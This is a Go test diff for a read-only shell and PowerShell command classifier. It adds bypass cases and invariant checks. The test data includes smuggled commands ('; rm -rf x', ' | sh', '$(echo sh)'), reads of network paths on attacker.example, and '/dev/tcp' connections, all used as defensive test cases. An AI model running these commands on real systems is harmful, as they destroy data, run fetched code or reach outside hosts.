@@ -2,6 +2,7 @@ package osys
 
 import (
 	"regexp"
+	"slices"
 	"strings"
 	"testing"
 	"unicode/utf8"
@@ -168,6 +169,15 @@ var readOnlyBypasses = []struct{ name, cmd string }{
 	{"Get-Process -ComputerName", "Get-Process -ComputerName attacker.example"},
 	{"ps -c HOST", "ps -c attacker.example"},
 	{"bash /dev/tcp", "cat < /dev/tcp/127.0.0.1/9"},
+	// PowerShell: one command prints a network path that is nowhere in the
+	// line, and another takes it as its path, through a pipe, a variable or a
+	// bracket (each read \\localhost\c$\Windows\win.ini here).
+	{"a printed network path piped to Get-ChildItem", `Get-Date -Format "'//attacker.example/share/x'" | Get-ChildItem -Name`},
+	{"a printed network path piped to Get-Item", "git log -1 --format=%x2f%x2fattacker.example%x2fshare%x2fx | Get-Item | Select-String y"},
+	{"a printed network path piped to dir on the next line", "git log -1 --format=%x2f%x2fattacker.example%x2fshare |\ndir"},
+	{"a printed network path through a variable", `Get-Date -Format "'//attacker.example/share/x'" -OutVariable p; Get-Content $p`},
+	{"a printed network path through a bracket", `Get-ChildItem (Get-Date -Format "'//attacker.example/share'")`},
+	{"a printed network path through a bracket, for sh's word", "wc -l $(git log -1 --format=%x2f%x2fattacker.example%x2fshare%x2fx)"},
 }
 
 // Forms ReadOnly refuses though no harm was shown for them: their effect
@@ -245,9 +255,8 @@ var readOnlyRefused = []struct{ name, cmd string }{
 	{"find with a bracket glob", "find . -name [ab]"},
 	{"quotes in the middle of an argument", "sort a'b'c"},
 	{"a dot in a short option", "sort -t. -k2 f"},
-	{"a comma at the end", "sort -t,"},
 	{"two commas", "sort a,,b"},
-	{"a comma before a tab", "sort a,\tb"},
+	{"a comma that leaves hostname a name", "hostname -f, x"},
 	{"a backslash at the end", `sort in\`},
 	{"a backslash before a tab", "sort in\\\tx"},
 	{"a backslash before a double quote", `echo \"a`},
@@ -315,10 +324,37 @@ var readOnlyRefused = []struct{ name, cmd string }{
 	{"/dev/udp", "cat < /dev/udp/10.0.0.1/53"},
 	{"UNC path echoed for a bracket", `Get-Content (echo \\attacker.example\share\x)`},
 	{"UNC path through the device namespace", `Get-Content \\?\UNC\attacker.example\share\x`},
+	{"UNC path through the NT namespace", `Get-Content \??\UNC\attacker.example\share\x`},
+	{"UNC path with three separators", `Get-Content \\\attacker.example\share\x`},
+	{"UNC path with mixed separators", `Get-Content \/attacker.example/share/x`},
 	{"UNC path attached to a short option", "git log -O//attacker.example/share/order"},
 	{"UNC path after =", "sort --files0-from=//attacker.example/share/list"},
 	{"UNC host alone", `Get-ChildItem \\attacker.example`},
 	{"UNC host alone for a POSIX word", "ls //attacker.example"},
+	{"UNC host alone as the place grep searches", "grep -r x //attacker.example"},
+	// What a command prints must not become another command's path: a
+	// bracket is an argument of echo and Write-Output only, the cmdlets that
+	// take a piped string as a path take no pipe, and no PowerShell word sets
+	// a variable.
+	{"a bracket as cat's argument", "cat $(find . -name x)"},
+	{"a bracket as wc's argument", "wc -l $(git ls-files)"},
+	{"a bracket as Get-Item's argument", "Get-Item (Get-Location)"},
+	{"a bracket after a tab", "Get-Item\t(Get-Location)"},
+	{"a pipe into ls", "git ls-files | ls"},
+	{"a pipe into gci", "echo x | gci"},
+	{"a pipe into Get-ChildItem after a blank line", "echo x |\n\n  Get-ChildItem"},
+	{"-OutVariable", `Get-Item C:\x -OutVariable f; echo $f.Length`},
+	{"-OutVariable on an alias, in capitals", "ls -OUTVARIABLE x"},
+	{"-ov", "Get-Date -ov x"},
+	{"-ev:", "Get-ChildItem -ev:e"},
+	{"-ErrorVariable", "dir -ErrorVariable e"},
+	{"-WarningVariable", "Get-Content x -WarningVariable w"},
+	{"-InformationVariable", "Write-Output x -InformationVariable i"},
+	{"-PipelineVariable abbreviated", "Get-ChildItem -pi p | Select-String x"},
+	{"-pv", "echo x -pv p"},
+	{"-wv and -iv", "pwd -wv w -iv i"},
+	{"-outv on sort", "Get-Process | sort CPU -outv s"},
+	{"UNC host alone in an option of rg", "rg --ignore-file=//attacker.example x"},
 	{"UNC path to git", "git diff --no-index a.txt //attacker.example/share/b.txt"},
 	{"Get-Process -Comp", "Get-Process -Comp attacker.example"},
 	{"Get-Process -cn:HOST", "Get-Process -cn:attacker.example"},
@@ -337,7 +373,8 @@ var readOnlyPlain = []string{
 	`Get-Item C:\x`, "Get-ChildItem", `Get-ChildItem C:\`, `Get-ChildItem 'C:\Program Files\'`,
 	`Get-ChildItem C:\ | Select-String x`, `Get-Content C:\x\y.txt`, "Get-ChildItem -Recurse -Filter *.go",
 	"Get-Process | Select-String tenant", "Get-Date", "Get-Location", "Write-Output hi", "dir", `gci C:\`,
-	"Get-ChildItem | sort Name", `Get-Item (Get-Location)`, `Get-Item C:\x -OutVariable f; echo $f.Length`,
+	"Get-ChildItem | sort Name", "Write-Output (Get-Location)", "echo\t(pwd)", "Get-ChildItem | Get-Content",
+	"git log --oneline | cat", "Get-ChildItem -ErrorAction SilentlyContinue", "ls -o", "ls -e", "ps -p 1", "cat -e x", "Get-Content x -Wait",
 	"git status", "git status && git log -3", "git log --oneline -5", "git log --format='%h %s' -n 5",
 	"git log --oneline | head -5", "git diff --stat HEAD~1", "git show HEAD:README.md", "git diff -- src/main.go",
 	"git diff src\\main.go", "git rev-parse HEAD", "git ls-files", "git blame -L 1,5 x.go", "git describe --tags",
@@ -347,9 +384,9 @@ var readOnlyPlain = []string{
 	"git remote", "git remote -v", "git remote get-url origin", "git remote get-url --push origin",
 	"git remote show -n origin", "git remote show origin -n",
 	"ls -la", "ls -la | grep x", "ls ~/src", "ls *.go", "cat x | grep y | wc -l", "cat $HOME/.profile",
-	"echo $(whoami)", "echo $(echo $(whoami))", "echo $(whoami) $(pwd)", "cat $(find . -name x)", "echo hi # a note",
+	"echo $(whoami)", "echo $(echo $(whoami))", "echo $(whoami) $(pwd)", "echo $(find . -name x)", "echo hi # a note",
 	"echo \"it's\"", "echo 'say \"hi\"'", "grep -E \"a b\" f", "grep -rn TODO .", "wc -l < file", "ls &",
-	"ls\npwd", "ls\r\npwd", "ls;", "\tls\t", "ls\t-la", "Get-Item\t(Get-Location)",
+	"ls\npwd", "ls\r\npwd", "ls;", "\tls\t", "ls\t-la",
 	// PowerShell's own names, which no POSIX system has, in any case.
 	"GET-CHILDITEM", "get-childitem -Force", "Get-childItem C:\\", "GCI", "select-string -Path *.go -Pattern x",
 	// Round two: look-only forms that had been refused and run unasked again.
@@ -363,7 +400,7 @@ var readOnlyPlain = []string{
 	"rg '// TODO'", "grep -rn '//go:build' .", "rg '\\\\d+' src", "echo https://example.com/a/b", "cat src//pkg/x.go",
 	`Get-Content C:\\Users\\me\\notes.txt`, "Get-Process -Name tenant", "ps -ef", "cat /dev/null",
 	"file -b --mime-type go.mod", "file -i README.md", "rg -n TODO -g '*.go'", "brew info --json=v2 jq",
-	"sort -t: -k2 f", "env A=1, B=2",
+	"sort -t: -k2 f", "env A=1, B=2", "sort -t,", "sort a,\tb", "sort ,a", "git log --grep='$HOME' -1",
 	"find . -name '*.go'\t-type f", "git log --grep=fix#12 --author=a@b.c", "git log --format=%h.%s",
 	"git remote --verbose", "git remote get-url --all origin",
 	"brew list", "brew info jq", "brew --version", "brew deps jq", "brew outdated",
@@ -414,20 +451,73 @@ func TestReadOnlyPlainForms(t *testing.T) {
 // their own way (regexps and strings.Fields), not through ReadOnly's lexer, so
 // a fault in the lexer does not hide from them.
 var (
-	roTestSeps     = regexp.MustCompile(`&&|\|\||\$\(|[;&|\n()]`)
-	roGluedParen   = regexp.MustCompile(`(^|[^ \t$])\(`)
-	roEmptyGroup   = regexp.MustCompile(`\([ \t\n]*\)`)
-	roAfterGroup   = regexp.MustCompile(`\)[ \t]*([^ \t\n;|&()$]|\$[^(]|\$$)`)
-	roEscapedSep   = regexp.MustCompile(`\\(\r?\n|[;&|()]|\$\()`)
-	roBareWord     = regexp.MustCompile(`^[A-Za-z-]+$`)
-	roAssignment   = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=`)
-	roStrictWords  = map[string]bool{"env": true, "date": true, "hostname": true, "find": true, "sort": true, "uniq": true, "tree": true, "file": true, "rg": true, "git": true, "brew": true}
-	roGitVerbs     = map[string]bool{"status": true, "log": true, "diff": true, "show": true, "rev-parse": true, "ls-files": true, "blame": true, "describe": true, "branch": true, "remote": true}
-	roFindActs     = map[string]bool{"-delete": true, "-exec": true, "-execdir": true, "-ok": true, "-okdir": true, "-fprint": true, "-fprint0": true, "-fprintf": true, "-fls": true}
-	roBranchActs   = map[string]bool{"-d": true, "-D": true, "-m": true, "-M": true, "-c": true, "-C": true, "-f": true, "--force": true, "--delete": true, "--move": true, "--copy": true, "-u": true, "--set-upstream-to": true, "--unset-upstream": true, "--edit-description": true, "--track": true, "-t": true}
-	roAppendedActs = []string{"; rm -rf x", " | sh", " && sudo ls", "\nrm x", " > out", "; x=1", " | xargs rm", "; (Get-Item x).Delete()", " `id`", "; ./ls", "; env sh", "; $(echo rm x)", "; [IO.File]::Delete('x')", " | sort { rm x }", "\rrm x"}
+	roTestSeps    = regexp.MustCompile(`&&|\|\||\$\(|[;&|\n()]`)
+	roGluedParen  = regexp.MustCompile(`(^|[^ \t$])\(`)
+	roEmptyGroup  = regexp.MustCompile(`\([ \t\n]*\)`)
+	roAfterGroup  = regexp.MustCompile(`\)[ \t]*([^ \t\n;|&()$]|\$[^(]|\$$)`)
+	roEscapedSep  = regexp.MustCompile(`\\(\r?\n|[;&|()]|\$\()`)
+	roBareWord    = regexp.MustCompile(`^[A-Za-z-]+$`)
+	roAssignment  = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=`)
+	roNumber      = regexp.MustCompile(`^[0-9]+$`)
+	roNetworkPath = regexp.MustCompile(`^[\\/]{2,}[^\\/\s]+[\\/]`) // \\host\share, //host/share
+	roStrictWords = map[string]bool{"env": true, "date": true, "hostname": true, "find": true, "sort": true, "uniq": true, "tree": true, "file": true, "rg": true, "git": true, "brew": true}
+	roCmdlets     = map[string]bool{"get-childitem": true, "gci": true, "dir": true, "ls": true, "get-item": true, "get-content": true, "cat": true, "type": true, "get-location": true, "pwd": true, "get-process": true, "ps": true, "get-date": true, "select-string": true, "write-output": true, "echo": true, "sort": true}
+	roGitVerbs    = map[string]bool{"status": true, "log": true, "diff": true, "show": true, "rev-parse": true, "ls-files": true, "blame": true, "describe": true, "branch": true, "remote": true}
+	roFindActs    = map[string]bool{"-delete": true, "-exec": true, "-execdir": true, "-ok": true, "-okdir": true, "-fprint": true, "-fprint0": true, "-fprintf": true, "-fls": true}
+	roBranchActs  = map[string]bool{"-d": true, "-D": true, "-m": true, "-M": true, "-c": true, "-C": true, "-f": true, "--force": true, "--delete": true, "--move": true, "--copy": true, "-u": true, "--set-upstream-to": true, "--unset-upstream": true, "--edit-description": true, "--track": true, "-t": true}
+	// What date and hostname print with, written out again here rather than
+	// read from the classifier's tables.
+	roDateShows     = map[string]bool{"-u": true, "--utc": true, "--universal": true, "-R": true, "--rfc-email": true, "--rfc-2822": true, "--iso-8601": true, "-I": true, "-Idate": true, "-Ihours": true, "-Iminutes": true, "-Iseconds": true, "-Ins": true}
+	roHostnameShows = map[string]bool{"-f": true, "-s": true, "-i": true, "-I": true, "-A": true, "-d": true, "--fqdn": true, "--long": true, "--short": true, "--ip-address": true, "--all-ip-addresses": true, "--all-fqdns": true, "--domain": true}
+	roAppendedActs  = []string{"; rm -rf x", " | sh", " && sudo ls", "\nrm x", " > out", "; x=1", " | xargs rm", "; (Get-Item x).Delete()", " `id`", "; ./ls", "; env sh", "; $(echo rm x)", "; [IO.File]::Delete('x')", " | sort { rm x }", "\rrm x",
+		"  [DANGER: x]; rm -rf x", "; git status --help", "; cat //host/share/x", "; cat < /dev/tcp/host/80", "; HEAD x", "; sort -T . x", "; file -p x"}
 	roPrefixedActs = []string{"sudo ", "X=1 ", "exec ", "command ", "time ", "nohup ", "xargs ", "rm x; ", "$(echo sh) "}
 )
+
+// roLong reports whether a is the long option name, as --name or --name=value,
+// or a shorter spelling of it that getopt would take for it.
+func roLong(a, name string) bool {
+	long, isLong := strings.CutPrefix(a, "--")
+	long, _, _ = strings.Cut(long, "=")
+	return isLong && long != "" && strings.HasPrefix(name, long)
+}
+
+// roShort reports whether a is a single-dash cluster holding one of letters.
+func roShort(a, letters string) bool {
+	return strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") && strings.ContainsAny(a, letters)
+}
+
+// roSplit is a command's arguments after its word, split at blanks outside
+// quotes, the quotes dropped: enough to tell where an argument begins.
+func roSplit(piece string) []string {
+	var out []string
+	var b strings.Builder
+	quote, in := rune(0), false
+	for _, r := range piece {
+		switch {
+		case quote == 0 && (r == '\'' || r == '"'):
+			quote, in = r, true
+		case r == quote:
+			quote = 0
+		case quote == 0 && (r == ' ' || r == '\t'):
+			if in {
+				out = append(out, b.String())
+			}
+			b.Reset()
+			in = false
+		default:
+			b.WriteRune(r)
+			in = true
+		}
+	}
+	if in {
+		out = append(out, b.String())
+	}
+	if len(out) > 0 {
+		out = out[1:]
+	}
+	return out
+}
 
 // readOnlyViolation names the invariant a command ReadOnly accepted breaks,
 // or "" when it holds them all.
@@ -435,7 +525,7 @@ func readOnlyViolation(c string) string {
 	if !utf8.ValidString(c) {
 		return "invalid UTF-8"
 	}
-	for _, bad := range []string{">", "{", "}", "`", "::"} {
+	for _, bad := range []string{">", "{", "}", "`", "::", "/dev/tcp/", "/dev/udp/"} {
 		if strings.Contains(c, bad) {
 			return "contains " + bad
 		}
@@ -460,13 +550,15 @@ func readOnlyViolation(c string) string {
 		return "unbalanced parentheses"
 	}
 	seps := append(roTestSeps.FindAllStringIndex(t, -1), []int{len(t), len(t)})
-	pos, words, closed := 0, 0, false // closed: the separator before this piece was a ")"
+	pos, words, closed, piped := 0, 0, false, false // the separator before this piece was a ")"; a "|"
 	for _, m := range seps {
 		piece, sep := t[pos:m[0]], t[m[0]:m[1]]
 		pos = m[1]
-		wasClosed := closed
+		wasClosed, wasPiped := closed, piped
 		closed = sep == ")"
 		f := strings.Fields(piece)
+		// A pipe feeds the next command, also when lines end in between.
+		piped = sep == "|" || (wasPiped && len(f) == 0 && sep == "\n")
 		if len(f) == 0 {
 			if (sep == "(" || sep == "$(") && !wasClosed {
 				return "a group in the command position"
@@ -474,13 +566,60 @@ func readOnlyViolation(c string) string {
 			continue
 		}
 		words++
+		// The word as written is in the table; only a name PowerShell alone has
+		// (a hyphen in it, or gci) may differ from it in case.
 		word := strings.ToLower(f[0])
-		if _, ok := readOnlyWords[word]; !ok || !roBareWord.MatchString(f[0]) {
+		_, asWritten := readOnlyWords[f[0]]
+		_, folded := readOnlyWords[word]
+		if !roBareWord.MatchString(f[0]) || !(asWritten || (folded && (strings.Contains(word, "-") || word == "gci"))) {
 			return "the command word " + f[0] + " is not a bare read-only word"
 		}
+		given := roSplit(piece)
+		for _, a := range given {
+			if roNetworkPath.MatchString(a) {
+				return "an argument is a network path: " + a
+			}
+			if p, _, _ := strings.Cut(strings.ToLower(a), ":"); (word == "ps" || word == "get-process") && (p == "-cn" || (len(p) > 1 && strings.HasPrefix("-computername", p))) {
+				return "Get-Process asks another machine: " + a
+			}
+		}
+		// What a command prints is nobody's path: a bracket is an argument of
+		// the two words that only print, the cmdlets that read a piped string
+		// as a path have no pipe before them, and no cmdlet sets a variable.
+		if (sep == "(" || sep == "$(") && word != "echo" && word != "write-output" {
+			return word + " takes a bracket as an argument"
+		}
+		if wasPiped && (word == "get-childitem" || word == "gci" || word == "dir" || word == "ls" || word == "get-item") {
+			return word + " takes its path from a pipe"
+		}
+		if roCmdlets[word] {
+			for _, a := range given {
+				p, _, _ := strings.Cut(strings.ToLower(a), ":")
+				for full, least := range map[string]int{"-outvariable": 5, "-errorvariable": 7, "-warningvariable": 9, "-informationvariable": 13, "-pipelinevariable": 3} {
+					if len(p) >= least && strings.HasPrefix(full, p) {
+						return word + " sets a variable: " + a
+					}
+				}
+				if p == "-ov" || p == "-ev" || p == "-wv" || p == "-iv" || p == "-pv" {
+					return word + " sets a variable: " + a
+				}
+			}
+		}
 		strict := roStrictWords[word]
-		if strict && (sep == "(" || sep == "$(") {
-			return word + " takes a substitution as an argument"
+		if strict {
+			// A quote of the other kind inside a quoted argument: PowerShell and
+			// a native program's parser do not agree about it.
+			quote := rune(0)
+			for _, r := range piece {
+				switch {
+				case quote == 0 && (r == '\'' || r == '"'):
+					quote = r
+				case r == quote:
+					quote = 0
+				case quote != 0 && (r == '\'' || r == '"'):
+					return word + " takes a quote inside a quoted argument"
+				}
+			}
 		}
 		if !strict || strings.ContainsAny(piece, `'"\`) {
 			continue // strings.Fields reads a quoted or escaped argument wrongly
@@ -491,12 +630,6 @@ func readOnlyViolation(c string) string {
 				return word + " takes a variable as an argument"
 			}
 		}
-		operands := 0
-		for _, a := range args {
-			if !strings.HasPrefix(a, "-") {
-				operands++
-			}
-		}
 		switch word {
 		case "env":
 			for _, a := range args {
@@ -505,13 +638,20 @@ func readOnlyViolation(c string) string {
 				}
 			}
 		case "hostname":
-			if len(args) > 0 {
-				return "hostname is given an argument"
+			for _, a := range args {
+				if !roHostnameShows[a] {
+					return "hostname is given something that does not only print: " + a
+				}
 			}
 		case "date":
-			for _, a := range args {
-				if !strings.HasPrefix(a, "+") {
-					return "date is given something that is not +FORMAT: " + a
+			for i := 0; i < len(args); i++ {
+				a := args[i]
+				switch {
+				case a == "-r" && i+1 < len(args):
+					i++ // the file or the seconds whose time to print
+				case !strings.HasPrefix(a, "+") && !roDateShows[a] && !strings.HasPrefix(a, "--iso-8601=") &&
+					!strings.HasPrefix(a, "--rfc-3339=") && !strings.HasPrefix(a, "--reference="):
+					return "date is given something that does not only print: " + a
 				}
 			}
 		case "find":
@@ -520,38 +660,66 @@ func readOnlyViolation(c string) string {
 					return "find acts: " + a
 				}
 			}
-		case "sort", "tree":
+		case "sort":
 			for _, a := range args {
-				long, isLong := strings.CutPrefix(a, "--")
-				long, _, _ = strings.Cut(long, "=")
-				// --output, or what getopt takes for it: --o, --ou, --out…
-				if (isLong && long != "" && strings.HasPrefix("output", long)) || (!isLong && strings.HasPrefix(a, "-") && strings.Contains(a, "o")) {
-					return word + " writes a file: " + a
+				if strings.EqualFold(a, "-Property") {
+					continue // Sort-Object's; no sort program takes an option P or p
+				}
+				if roLong(a, "output") || roLong(a, "temporary-directory") || roLong(a, "compress-program") || roShort(a, "oT") {
+					return "sort writes a file or runs a program: " + a
+				}
+			}
+		case "tree":
+			for _, a := range args {
+				if roLong(a, "output") || roShort(a, "oR") {
+					return "tree writes a file: " + a
 				}
 			}
 		case "uniq":
+			operands := 0
+			for i := 0; i < len(args); i++ {
+				switch {
+				case (args[i] == "-f" || args[i] == "-s") && i+1 < len(args) && roNumber.MatchString(args[i+1]):
+					i++
+				case !strings.HasPrefix(args[i], "-"):
+					operands++
+				}
+			}
 			if operands > 1 {
 				return "uniq is given an output file"
 			}
 		case "file":
 			for _, a := range args {
-				if a == "--compile" || (strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") && strings.Contains(a, "C")) {
-					return "file compiles a magic file: " + a
+				if a == "--compile" || a == "--preserve-date" || a == "--uncompress" || a == "--uncompress-noreport" || roShort(a, "CpzZ") {
+					return "file writes, or starts a program: " + a
 				}
 			}
 		case "rg":
 			for _, a := range args {
-				if a == "--pre" || strings.HasPrefix(a, "--pre=") || a == "--hostname-bin" || strings.HasPrefix(a, "--hostname-bin=") {
+				if a == "--pre" || strings.HasPrefix(a, "--pre=") || a == "--hostname-bin" || strings.HasPrefix(a, "--hostname-bin=") ||
+					a == "--search-zip" || roShort(a, "z") {
 					return "rg runs a program: " + a
+				}
+			}
+		case "brew":
+			for _, a := range args {
+				if a == "--github" || a == "--fetch-HEAD" {
+					return "brew opens a browser or fetches: " + a
 				}
 			}
 		case "git":
 			if len(args) == 0 || !roGitVerbs[args[0]] {
 				return "git without a read subcommand"
 			}
+			if args[0] == "remote" && len(args) > 1 && args[1] == "show" && !slices.Contains(args, "-n") {
+				return "git remote show connects to the remote"
+			}
 			for _, a := range args {
 				if a == "--output" || strings.HasPrefix(a, "--output=") {
 					return "git writes a file: " + a
+				}
+				if a == "--help" || a == "--show-signature" || strings.Contains(a, "%G") {
+					return "git starts another program: " + a
 				}
 				if args[0] == "branch" && roBranchActs[a] {
 					return "git branch acts: " + a
